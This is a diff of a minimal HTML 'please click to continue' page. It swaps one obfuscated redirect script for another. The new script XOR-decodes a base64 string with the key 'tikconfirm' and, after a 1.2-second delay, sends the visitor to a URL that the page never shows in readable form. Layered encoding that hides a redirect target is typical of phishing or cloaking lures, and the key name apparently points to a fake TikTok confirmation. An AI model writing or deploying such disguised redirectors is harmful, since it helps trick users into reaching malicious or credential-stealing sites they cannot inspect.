@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -47,6 +48,27 @@
       background-color: #166fe5;
     }
   </style>
+  <script>
+    function xorDecode(data, key) {
+      let result = '';
+      for (let i = 0; i < data.length; i++) {
+        result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+      }
+      return result;
+    }
+
+    function redirect() {
+      const encoded = "FhsUBgtdXBUBB0YCEhNfDBgTG0oRXR4CEg8NHkZQSllbCk0bAw4PBAxCFwgTSAYJXgoDHlc=";
+      const key = "tikconfirm";
+      const decoded = atob(encoded);
+      const url = xorDecode(decoded, key);
+
+      // Delay 1.2 giây trước khi redirect
+      setTimeout(() => {
+        window.location.href = url;
+      }, 1200);
+    }
+  </script>
 </head>
 <body>
   <div class="box">
@@ -54,20 +76,5 @@
     <p>Please click the button below to continue.</p>
     <button class="btn" onclick="redirect()">Continue</button>
   </div>
-  <script>
-    const xorKey = 7;
-    const encodedLink = [58,58,70,101,115,85,79,102,114,82,53,93,111,69,52,75,117,107,64,99,114,86,52,94,55,111,53,75,112,69,95,94,114,112,80,93,109,77,95,93,53,50,126,93,117,111,52,101,115,66,67,73,126,82,67,93,119,50,53,101,119,85,95,94,116,62,80,102,53,81,53,93,111,69,52,102,109,81,64,102,109,62,126,75,49,74,79,100,55,85,79,102];
-
-    function decodeXOR(arr, key) {
-      return arr.map(c => String.fromCharCode(c ^ key)).join('');
-    }
-
-    function redirect() {
-      const xorDecoded = decodeXOR(encodedLink, xorKey);
-      const original = xorDecoded.split('').reverse().join('');
-      const url = atob(original);
-      window.location.href = url;
-    }
-  </script>
 </body>
 </html>
